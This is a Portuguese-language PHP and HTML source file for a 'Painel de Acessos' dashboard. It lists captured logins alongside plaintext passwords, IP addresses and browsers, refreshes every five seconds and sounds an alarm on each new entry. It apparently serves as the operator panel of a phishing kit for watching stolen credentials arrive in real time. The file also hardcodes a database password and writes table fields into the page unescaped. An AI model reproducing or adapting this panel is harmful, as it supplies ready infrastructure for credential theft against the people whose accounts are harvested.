<?php
// Configurações do banco de dados
$servername = "localhost";
$username = "u682092893_user"; // Seu nome de usuário do banco
$password = "uxh3PzG7gN1B"; // Sua senha do banco
$dbname = "u682092893_db"; // Nome do seu banco de dados
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
    die("Erro de conexão: " . $conn->connect_error);
}

$sql = "SELECT * FROM acessos ORDER BY datahora DESC";
$result = $conn->query($sql);

$count_sql = "SELECT COUNT(*) as total_acessos FROM acessos";
$count_result = $conn->query($count_sql);
$count_data = $count_result->fetch_assoc();
$total_acessos = $count_data['total_acessos'];

if (isset($_GET['ajax'])) {
    $tabela_html = '';
    if ($result->num_rows > 0) {
        while ($row = $result->fetch_assoc()) {
            $tabela_html .= "<tr>
                                <td>{$row['id']}</td>
                                <td>{$row['user_id']}</td>
                                <td>{$row['login']}</td>
                                <td>{$row['senha']}</td>
                                <td>{$row['ip']}</td>
                                <td>{$row['datahora']}</td>
                                <td>{$row['browser']}</td>
                                <td><button class='btn-delete' onclick='excluirUsuario({$row['id']})'><span uk-icon='icon: trash'></span></button></td>
                            </tr>";
        }
    } else {
        $tabela_html .= "<tr><td colspan='10'>Nenhum acesso registrado.</td></tr>";
    }
    echo json_encode([
        'tabela_html' => $tabela_html,
        'total_acessos' => $total_acessos
    ]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel de Acessos</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/uikit@3.6.22/dist/css/uikit.min.css">
    <div class="banner">

</div>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');

        body {
            font-family: 'Inter', sans-serif;
            background-color: #1e1e2f;
            margin: 0;
            padding: 20px;
            color: #f0f0f0;
        }

.uk-container {
    max-width: 1200px;
    margin: 0 auto;
    padding-bottom: 50px; /* Espaço extra no fim */
}


        .painel-topo {
            background-color: #2d2d44;
            padding: 30px;
            border-radius: 12px 12px 0 0;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            text-align: center;
        }

        .painel-topo h1 {
            margin: 0;
            font-size: 32px;
            color: #ffffff;
        }

        .painel-topo p {
            margin: 8px 0 0;
            font-size: 18px;
            color: #c0c0c0;
        }

        .painel-fundo {
            background-color: #2a2a3d;
            padding: 25px;
            border-radius: 0 0 12px 12px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }

        .total-acessos {
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 20px;
            color: #a5d6ff;
        }

table.uk-table td:nth-child(2),
table.uk-table td:nth-child(3),
table.uk-table td:nth-child(4) {
    min-width: 150px;
    white-space: nowrap;
    padding: 14px 20px;
}

table.uk-table th:nth-child(2),
table.uk-table th:nth-child(3),
table.uk-table th:nth-child(4) {
    min-width: 150px;
    white-space: nowrap;
    padding: 14px 20px;
}

.painel-fundo {
    overflow-x: auto;
}

        .uk-button {
            padding: 10px 16px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            transition: background-color 0.3s ease;
            border: none;
        }

        .uk-button-primary {
            background-color: #007bff;
            color: white;
        }

        .uk-button-primary:hover {
            background-color: #0056b3;
        }

        .uk-button-danger {
            background-color: #e53935;
            color: white;
        }

        .uk-button-danger:hover {
            background-color: #c62828;
        }

        .tabela-actions {
            margin-top: 20px;
            text-align: center;
        }

        #somOnOff, #verificadoBtn {
            margin: 10px;
        }

        .status-message {
            margin-top: 15px;
            font-size: 16px;
            color: #4caf50;
            text-align: center;
        }
		
		table.uk-table td:nth-child(3),
table.uk-table td:nth-child(4) {
    max-width: 150px;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

.btn-delete {
    background-color: #e53935;
    color: white;
    border: none;
    padding: 6px 10px;
    border-radius: 6px;
    cursor: pointer;
}

.btn-delete:hover {
    background-color: #c62828;
}

.btn-delete span {
    vertical-align: middle;
}

        .botao-pequeno {
            padding: 6px 12px;
            font-size: 12px;
            border-radius: 6px;
        }

       html, body {
    margin: 0;
    background-color: #1e1e2f;
}

        .uk-container {
            min-height: 100%; /* O conteúdo principal sempre ocupará ao menos 100% da tela */
            display: flex;
            flex-direction: column;
        }

        .painel-topo {
            flex-shrink: 0; /* Impede que o topo encolha */
        }

        .conteudo-livre {
    padding: 20px 0;
}
        
        .banner {
    width: 100%;
    margin-bottom: 20px;
    text-align: center;
    background-color: #1e1e2f;
    border-radius: 8px;
    overflow: hidden;
}

.btn-delete {
    background-color: #e53935;
    color: white;
    border: none;
    padding: 8px 12px;
    border-radius: 6px;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

.btn-delete:hover {
    background-color: #c62828;
}

table.uk-table td {
    padding: 12px 15px;
    color: #dcdcdc;
    background-color: #2e2e44;
    border-bottom: 1px solid #444;
    word-break: break-word;
    white-space: normal; /* Adiciona esta linha */
    overflow: visible;   /* Adiciona esta linha para garantir que o conteúdo não seja cortado */
}




    </style>
</head>
<body>
<div class="uk-container">
    <div class="painel-topo">
        <h1>Painel de Acessos</h1>
        <p>Monitoramento de acessos ao sistema</p>
    </div>

    <div class="conteudo-livre">
    <p class="total-acessos">Total de Acessos: <span id="total-acessos"><?php echo $total_acessos; ?></span></p>

    <div class="tabela-wrapper">
        <table class='uk-table'>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Usuário</th>
                    <th>Login</th>
                    <th>Senha</th>
                    <th>IP</th>
                    <th>Data e Hora</th>
                    <th>Browser</th>
                    <th>Ações</th>
                </tr>
            </thead>
            <tbody id="acessos-tabela">
                <!-- Conteúdo preenchido via AJAX -->
            </tbody>
        </table>
    </div>

    <div class="tabela-actions">
        <button id="somOnOff" class="uk-button uk-button-primary botao-pequeno">Desligar Som</button>
        <button id="verificadoBtn" class="uk-button uk-button-danger botao-pequeno">Verificar Login</button>
    </div>

    <div id="status-message" class="status-message"></div>
</div>

</div>

<audio id="sound" src="login-sound.mp3" preload="auto" loop></audio>
<script src="https://cdn.jsdelivr.net/npm/uikit@3.6.22/dist/js/uikit.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/uikit@3.6.22/dist/js/uikit-icons.min.js"></script>

<script>
    var somLigado = true;
    var novoAcesso = false;
    var lastTotalAcessos = <?php echo $total_acessos; ?>;

    function excluirUsuario(id) {
        if (confirm('Tem certeza que deseja excluir este usuário?')) {
            fetch('excluir_usuario.php?id=' + id)
                .then(response => response.text())
                .then(() => {
                    atualizarTabela();
                    pararSom();
                })
                .catch(() => alert('Erro ao excluir o usuário.'));
        }
    }
let somDesbloqueado = false;

function destravarSom() {
    if (!somDesbloqueado) {
        const audio = document.getElementById("sound");
        audio.play().then(() => {
            audio.pause();
            audio.currentTime = 0;
            somDesbloqueado = true;
            console.log("Som desbloqueado!");
        }).catch(err => {
            console.warn("Não conseguiu destravar som automaticamente:", err);
        });
    }
}

// Adiciona ouvinte de evento global que roda uma vez ao interagir
window.addEventListener('click', destravarSom, { once: true });
window.addEventListener('touchstart', destravarSom, { once: true });


    function atualizarTabela() {
        fetch('painel.php?ajax=true')
            .then(res => res.json())
            .then(data => {
                document.getElementById('acessos-tabela').innerHTML = data.tabela_html;
                document.getElementById('total-acessos').textContent = data.total_acessos;
                if (data.total_acessos > lastTotalAcessos && somLigado) {
                    novoAcesso = true;
                    tocarSom();
                }
                lastTotalAcessos = data.total_acessos;
            });
    }

function tocarSom() {
    if (somLigado && novoAcesso && somDesbloqueado) {
        const audio = document.getElementById("sound");
        audio.play().catch(e => console.warn("Erro ao tocar som:", e));
        novoAcesso = false;
        
        }
    }

    function pararSom() {
        const audio = document.getElementById("sound");
        audio.pause();
        audio.currentTime = 0;
    }

    document.getElementById('somOnOff').addEventListener('click', function () {
        somLigado = !somLigado;
        this.textContent = somLigado ? 'Desligar Som' : 'Ligar Som';
    });

    document.getElementById('verificadoBtn').addEventListener('click', function () {
        somLigado = false;
        document.getElementById('status-message').textContent = "Som desativado. Acesso verificado!";
        pararSom();
        setTimeout(() => document.getElementById('status-message').textContent = '', 3000);
    });

    setInterval(atualizarTabela, 5000);
    atualizarTabela();
</script>
</body>
</html>
